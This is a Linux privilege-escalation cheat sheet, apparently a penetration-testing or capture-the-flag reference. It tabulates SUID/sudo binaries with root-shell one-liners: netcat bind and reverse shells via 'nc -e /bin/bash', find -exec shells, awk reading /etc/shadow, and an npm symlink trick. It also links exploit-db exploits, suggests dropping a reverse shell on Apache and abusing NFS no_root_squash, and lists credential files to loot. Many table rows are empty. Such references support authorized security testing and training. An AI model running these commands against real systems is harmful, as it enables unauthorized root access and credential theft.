Linux Privilege Escalation


If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:

| SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
|---------------------------------------|-------------------------------------------------------------------------------------|
| (ALL : ALL ) ALL                      | You can run any command as root.<br>sudo su - <br>sudo /bin/bash                                 |
| nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
| netcat<br>nc<br>nc.traditional        | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
| ncat                                  |                                                                                     |
| awk <br>gawk                          | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
| php                                   |      |
| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
| xxd                                   |                                                                                     |
| vi                                    |                                                                                     |
| more                                  |                                                                                     |
| less                                  |                                                                                     |
| nano                                  |                                                                                     |
| cp                                    |                                                                                     |
| cat                                   |                                                                                     |
| bash                                  |                                                                                     |
| ash                                  |                                                                                     |
| sh                                  |                                                                                     |
| csh                                  |                                                                                     |
| curl                                  |                                                                                     |
| dash                                  |                                                                                     |
| pico                                  |                                                                                     |
| nano                                  |                                                                                     |
| vrim                                  |                                                                                     |
| tclsh                                  |                                                                                     |
| git                                  |                                                                                     |
| scp                                  |                                                                                     |
| expect                                  |                                                                                     |
| ftp                                  |                                                                                     |
| socat                                  |                                                                                     |
| script                                  |                                                                                     |
| ssh                                  |                                                                                     |
| zsh                                  |                                                                                     |
| tclsh                                  |                                                                                     |
| strace                                  |  Write and compile a a SUID SUID binary c++ program <br> strace chown root:root suid <br> strace chmod u+s suid <br> ./suid        |
| npm                                 |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
| rsync                                  |                                                                                     |
| tar                                  |                                                                                     |
|Screen-4.5.00 				| https://www.exploit-db.com/exploits/41154/					   |

*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here:  
https://gtfobins.github.io/


Can I access services that are running as root on the local network?  
`netstat -antup`  
`ps -aux | grep root`  

| Network Services Running as Root      | Exploit actions                                                                     |
|---------------------------------------|-------------------------------------------------------------------------------------|
| mysql                                 | raptor_udf2 exploit<br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
| apache 			        | drop a reverse shell script on to the webserver                                     |
| nfs	 			        | no_root_squash parameter <br>  Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
| PostgreSQL                            | https://www.exploit-db.com/exploits/45184/                                          |


Are there any active tmux sessions we can connect to?  
`tmux ls`  

## What can we READ?
What files and folders are in my home user's directory?  
`ls -la ~`  

Do any users have passwords stored in the passwd file?
`cat /etc/passwd`  

Are there passwords for other users or RSA keys for SSHing into the box?  
`ssh -i id_rsa root@10.10.10.10`  

Are there configuration files that contain credentials?

| Application and config file           | Config File Contents                                                                |
|---------------------------------------|-------------------------------------------------------------------------------------|
| WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');<br> define('DB_USER', 'root');<br> define('DB_PASS', 'john@123');<br>        |
| Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
| .ssh directory 		        | authorized_keys<br>id_rsa<br>id_rsa.keystore<br>id_rsa.pub<br>known_hosts            |
| User MySQL Info	                | .mysql_history<br>.my.cnf						               |
| User Bash History 	                | .bash_history                  					               |
